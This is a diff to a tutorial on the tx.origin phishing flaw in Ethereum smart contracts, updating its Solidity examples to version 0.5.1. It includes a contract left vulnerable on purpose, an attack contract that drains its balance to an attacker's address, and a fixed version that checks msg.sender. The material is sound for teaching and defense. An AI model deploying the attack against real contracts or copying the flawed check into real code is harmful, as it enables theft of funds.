@@ -20,36 +20,40 @@ As with all software, there is a chance that a smart contract may be exploited. 
 2. First, we begin by creating a contract with a simple purpose such as temporarily holding Ether for the owner (just as legitimate contracts in use hold Ether to enable various functions). Copy the following code into [Remix]:  
     [_Phishable.sol_][Phishable.sol]
     ```solidity
+    pragma solidity ^0.5.1;
+
     contract Phishable {
         address public owner;
-        constructor (address _owner) {
+        constructor (address _owner) public {
             owner = _owner;
         }
 
-        function () public payable {} // collect ether
+        function () external payable {} // collect ether
 
-        function withdrawAll(address _recipient) public {
+        function withdrawAll(address payable _recipient) public {
             require(tx.origin == owner);
-            _recipient.transfer(this.balance);
+            _recipient.transfer(address(this).balance);
         }
     }
     ```
 3. We then create another contract to attack `Phishable.sol`. In a new document, create `AttackContract.sol`:  
     [_AttackContract.sol_][AttackContract.sol]
     ```solidity
+    pragma solidity ^0.5.1;
+
     import "browser/Phishable.sol";
 
     contract AttackContract {
         Phishable phishableContract;
 
-        address attacker; // The attacker's address to receive funds
+        address payable attacker; // The attacker's address to receive funds
 
-        constructor (Phishable _phishableContract, address _attackerAddress) {
+        constructor (Phishable _phishableContract, address payable _attackerAddress) public {
             phishableContract = _phishableContract;
             attacker = _attackerAddress;
         }
 
-        function () payable {
+        function () external payable {
             phishableContract.withdrawAll(attacker);
         }
     }
@@ -58,17 +62,19 @@ As with all software, there is a chance that a smart contract may be exploited. 
 5. We can prevent an attack like this (that is, exploiting the use of tx.origin for authentication purposes) by checking that the sender is the owner instead. In the `Phishable.sol` contract, change the line `require(tx.origin == owner);` to `require(msg.sender == owner);`. Now, when `AttackContract` is paid an amount by the owner of `Phishable` and calls `Phishable`’s `withdrawAll` function, the funds will not be transferred to the attacker’s address, since they are not the owner. We'll call this updated version `UnPhishable`. The code should look like this:  
     [_UnPhishable.sol_][UnPhishable.sol]
     ```solidity
+    pragma solidity ^0.5.1;
+
     contract UnPhishable {
         address public owner;
-        constructor (address _owner) {
+        constructor (address _owner) public {
             owner = _owner;
         }
 
-        function () public payable {} // collect ether
+        function () external payable {} // collect ether
 
-        function withdrawAll(address _recipient) public {
+        function withdrawAll(address payable _recipient) public {
             require(msg.sender == owner);
-            _recipient.transfer(this.balance);
+            _recipient.transfer(address(this).balance);
         }
     }
     ```
